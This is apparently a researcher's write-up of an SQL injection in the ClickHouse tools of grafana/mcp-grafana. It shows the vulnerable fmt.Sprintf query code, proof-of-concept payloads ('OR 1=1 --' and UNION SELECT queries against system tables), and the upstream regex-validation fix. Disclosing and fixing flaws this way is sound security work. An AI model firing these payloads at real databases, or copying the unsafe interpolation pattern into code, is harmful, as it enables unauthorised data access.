# Grafana MCP ClickHouse Tools – SQL Injection Write-up

## Summary

I identified and helped fix an SQL injection issue in the ClickHouse metadata tools of `mcp-grafana`, specifically in the paths used by:

* `list_clickhouse_tables`
* `describe_clickhouse_table`

The issue was caused by user-controlled input being directly interpolated into SQL query strings with `fmt.Sprintf`, allowing query manipulation and cross-database metadata access.

This issue was later fixed upstream via pull request:

---

## Affected Component

* Project: `grafana/mcp-grafana`
* File: `tools/clickhouse.go`
* Relevant functions:

  * `listClickHouseTables`
  * `describeClickHouseTable`

---

## Root Cause

The vulnerable pattern was direct SQL string construction using unsanitized user input.

### Vulnerable pattern

```go
query += fmt.Sprintf(" AND database = '%s'", args.Database)
```

and:

```go
query := fmt.Sprintf(`SELECT name, type, default_kind as default_type, default_expression, comment
FROM system.columns
WHERE database = '%s' AND table = '%s'
ORDER BY position`, database, args.Table)
```

### Why this was dangerous

The `database` and `table` fields were influenced by user input. Because those values were inserted directly into SQL strings, an attacker could alter query structure rather than only providing literal filter values.

---

## Security Impact

### What the issue allowed

An attacker with access to the MCP interface could:

* manipulate SQL logic in ClickHouse metadata queries
* bypass intended filtering by database
* enumerate tables from unintended databases
* extract metadata from ClickHouse system tables

### Practical result

This broke the intended tool boundary:

* **Intended:** user asks for metadata about one database/table
* **Actual:** user can alter the backend SQL and retrieve metadata outside the intended scope

---

## Attack Path

```text
Attacker
  -> MCP client / MCP Inspector / exposed MCP transport
  -> tools/call
  -> list_clickhouse_tables or describe_clickhouse_table
  -> unsanitized SQL string construction in mcp-grafana
  -> ClickHouse backend query execution
  -> unintended metadata disclosure
```

---

## Proof of Concept

### Setup Env

```
 docker compose up -d
 npx @modelcontextprotocol/inspector
```

<img width="1422" height="278" alt="image" src="https://github.com/user-attachments/assets/673b8960-418a-4273-ba99-f4ae72bfd54d" />

Set environment variables:
```
GRAFANA_URL=http://localhost:3000
GRAFANA_SERVICE_ACCOUNT_TOKEN=<token>
```

<img width="940" height="475" alt="image" src="https://github.com/user-attachments/assets/fc556286-2705-4287-9077-b518d14358d7" />

<img width="600" height="711" alt="image" src="https://github.com/user-attachments/assets/e9c53d3d-7dfd-4a3c-b436-042dd8d94e94" />

<img width="940" height="441" alt="image" src="https://github.com/user-attachments/assets/ccdcedee-81fb-4c06-bf1e-58fbac8a5819" />


### 1. Baseline request

Use the `list_clickhouse_tables` tool with a normal database name:

```json
{
  "datasourceUid": "clickhouse",
  "database": "default"
}
```

**Expected result:** only tables from the `default` database are returned.

<img width="819" height="493" alt="image" src="https://github.com/user-attachments/assets/e336ba6c-e212-45a7-8523-95973eed5df1" />


---

### 2. Filter bypass payload

```json
{
  "datasourceUid": "clickhouse",
  "database": "default' OR 1=1 --"
}
```

**Observed result:** results included tables from unintended databases such as:

* `system`
* `INFORMATION_SCHEMA`
* `information_schema`

This confirmed that the backend SQL filter could be bypassed.

<img width="820" height="608" alt="image" src="https://github.com/user-attachments/assets/e075ca89-8105-4652-b919-f74654b21604" />

<img width="772" height="577" alt="image" src="https://github.com/user-attachments/assets/367ae9f1-0a1a-4432-a9ff-c7eeaa6c574b" />


---

### 3. Database enumeration payload

```json
{
  "datasourceUid": "clickhouse",
  "database": "default' UNION ALL SELECT name, NULL, NULL, NULL, NULL FROM system.databases --"
}
```

**Observed result:** database names from `system.databases` were returned through the tool response.

<img width="808" height="608" alt="image" src="https://github.com/user-attachments/assets/c0699726-bdab-40c7-9e78-60cd0d1c5e28" />


---

### 4. System table enumeration payload

```json
{
  "datasourceUid": "clickhouse",
  "database": "default' UNION ALL SELECT name, NULL, NULL, NULL, NULL FROM system.tables WHERE database = 'system' --"
}
```

**Observed result:** system table names were returned via the metadata tool response.

<img width="791" height="615" alt="image" src="https://github.com/user-attachments/assets/53f588cb-b846-490a-b5fa-4de542a515ee" />

---

## Expected vs Actual Behavior

### Expected

The `database` or `table` parameters should behave only as literal identifiers or filter values.
They should never be able to modify the structure of the SQL query.

### Actual

User-controlled input could alter the SQL query itself, allowing access to metadata outside the intended scope of the tool.

---

## Why This Matters

This was not just malformed input or a harmless bug. It allowed:

* query structure manipulation
* cross-database metadata disclosure
* access to internal ClickHouse metadata through an MCP abstraction that was expected to constrain access

Even though the maintainers ultimately classified it as a bug rather than a vulnerability, from a security analysis perspective it demonstrated unsafe query construction and a broken trust boundary between MCP tool arguments and backend SQL execution.

---

## Remediation

The upstream fix added strict validation for user-controlled ClickHouse identifiers before interpolating them into SQL strings.

### Fix strategy

* validate `database` identifiers before use
* validate `table` identifiers before use
* reject unexpected characters
* enforce non-empty `table` names where required

### Validation approach

```go
var clickHouseIdentifierRe = regexp.MustCompile(`^[a-zA-Z0-9_]+$`)
```

This prevented common SQL injection payloads from reaching the query construction sink.

---

## Upstream Fix

**PR Link:** `https://github.com/grafana/mcp-grafana/pull/693`

<img width="1919" height="968" alt="image" src="https://github.com/user-attachments/assets/694153b5-df50-43ca-bddd-9b13cd1db2e0" />


---

## Credit

Discovered, validated, and fixed by:

Pham Quang Minh





